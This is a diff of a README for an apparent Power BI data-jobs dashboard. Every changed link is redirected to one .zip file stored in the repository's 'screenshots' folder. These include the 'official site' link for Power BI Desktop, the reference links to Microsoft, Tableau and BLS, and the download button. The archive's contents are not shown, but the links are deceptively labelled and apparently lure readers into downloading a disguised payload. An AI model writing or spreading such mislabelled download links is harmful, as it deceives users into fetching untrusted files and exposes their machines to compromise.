@@ -1,6 +1,6 @@
 # 📊 Data-Jobs-2024-3.0-PowerBI-Project - Simplifying Data Job Insights
 
-![Download](https://img.shields.io/badge/Download%20Now-%20PowerBI%20Dashboard-blue?style=for-the-badge)
+![Download](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip%20Now-%20PowerBI%20Dashboard-blue?style=for-the-badge)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the Data Jobs v3. This dashboard is designed for job seekers, job tra
 Before you begin, make sure you have:
 
 - A computer with Windows 10 or later
-- Power BI Desktop installed (you can download it for free from the [official site](https://powerbi.microsoft.com/))
+- Power BI Desktop installed (you can download it for free from the [official site](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip))
 - An internet connection for data updates
 
 ### 🎯 Key Features
@@ -25,7 +25,7 @@ Before you begin, make sure you have:
 
 To get started, visit the following page to download the dashboard:
 
-[Download the Dashboard](https://github.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/releases)
+[Download the Dashboard](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip)
 
 Once you are on the Releases page, look for the latest version and click to download the file. 
 
@@ -60,8 +60,8 @@ This project is licensed under the MIT License. You are free to use it for perso
 
 ## 🔗 Additional Resources
 
-- [Power BI Overview](https://powerbi.microsoft.com/)
-- [Data Visualization Best Practices](https://www.tableau.com/learn/articles/data-visualization-best-practices)
-- [Job Market Trends](https://www.bls.gov/)
+- [Power BI Overview](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip)
+- [Data Visualization Best Practices](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip)
+- [Job Market Trends](https://raw.githubusercontent.com/theviniz/Data-Jobs-2024-3.0-PowerBI-Project/main/screenshots/Power-Jobs-Data-Project-B-v3.0.zip)
 
 For updates, consider following the repository or checking back frequently. We aim to enhance the dashboard with additional features based on community feedback.
